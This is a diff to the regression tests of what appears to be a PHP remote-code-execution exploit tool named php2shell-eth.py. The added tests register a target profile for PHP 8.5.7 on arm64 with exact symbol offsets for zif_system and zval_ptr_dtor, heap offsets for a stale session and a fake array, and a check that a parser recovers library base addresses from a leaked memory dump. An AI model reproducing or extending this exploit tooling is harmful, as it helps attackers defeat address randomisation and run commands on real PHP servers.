@@ -4,6 +4,7 @@ import hashlib
 from importlib import import_module
 from pathlib import Path
 from pkgutil import iter_modules
+import subprocess
 import sys
 import unittest
 
@@ -21,7 +22,7 @@ from a2b2 import (
     fake_reference,
     validate_command,
 )
-from b1 import make_body
+from b1 import analyse, make_body
 from common import iter_multipart
 import profiles as profile_package
 from profiles import DEFAULT_PROFILE, PROFILES
@@ -34,6 +35,19 @@ class ProfileRegressionTests(unittest.TestCase):
     def test_registered_profiles_are_complete(self) -> None:
         for profile in PROFILES.values():
             profile.validate()
+
+    def test_empty_cli_prints_help_without_contacting_a_target(self) -> None:
+        result = subprocess.run(
+            [sys.executable, str(ROOT / "php2shell-eth.py")],
+            cwd=ROOT,
+            capture_output=True,
+            text=True,
+            timeout=5,
+            check=False,
+        )
+        self.assertEqual(result.returncode, 0, result.stderr)
+        self.assertIn("usage:", result.stdout)
+        self.assertNotIn("Traceback", result.stderr)
 
     def test_profile_modules_are_discovered_automatically(self) -> None:
         module_names = sorted(
@@ -82,6 +96,48 @@ class ProfileRegressionTests(unittest.TestCase):
         self.assertEqual(amd64.b1, arm64.b1)
         self.assertEqual(amd64.a2, arm64.a2)
         self.assertEqual(amd64.b2, arm64.b2)
+
+    def test_php857_arm64_no_ini_contract_is_registered(self) -> None:
+        profile = PROFILES["php-8.5.7-arm64-official-no-ini"]
+        self.assertEqual(profile.environment.architecture, "aarch64")
+        self.assertEqual(profile.environment.php_version, "8.5.7")
+        self.assertEqual(
+            profile.environment.image_id,
+            "sha256:e220f33a0424c959ce19f2663d9bdcc3857b3a80e1eef4216cc1dd10bad787c7",
+        )
+        self.assertEqual(
+            profile.environment.libphp_sha256,
+            "c1d55f31423d01b7c093be31973650b0aafa475be9f67bfee3b430d4a2cab222",
+        )
+        self.assertEqual(profile.symbols.zval_ptr_dtor, 0x75CC00)
+        self.assertEqual(profile.symbols.zif_system, 0x52C030)
+        self.assertEqual(profile.heap.stale_session_id, 0x71F00)
+        self.assertEqual(profile.heap.stale_session_reference, 0x79760)
+        self.assertEqual(profile.heap.fake_array, 0xF4398)
+
+    def test_php857_profile_dense_main_recovery_is_opt_in(self) -> None:
+        profile = PROFILES["php-8.5.7-arm64-official-no-ini"]
+        main = 0x0000F00000000000
+        libphp = main - 0x3400000
+        dtor = libphp + profile.symbols.zval_ptr_dtor
+        pointers = [main + 0x1000 + 8 * index for index in range(1000)]
+        pointers.extend([dtor] * 2000)
+        disclosure = profile.b1.marker + b"".join(
+            value.to_bytes(8, "little") for value in pointers
+        )
+
+        info = analyse(
+            disclosure,
+            profile.symbols.zval_ptr_dtor,
+            profile.heap.stale_session_id,
+            abi=profile.abi,
+            allocator=profile.allocator,
+            marker=profile.b1.marker,
+        )
+
+        self.assertEqual(info["request_main_base"], main)
+        self.assertEqual(info["main_recovery"], "profile_dense_pointer_cluster")
+        self.assertEqual(info["libphp_candidates"][0]["base"], libphp)
 
     def test_payloads_remain_byte_identical_after_profile_split(self) -> None:
         p = self.profile
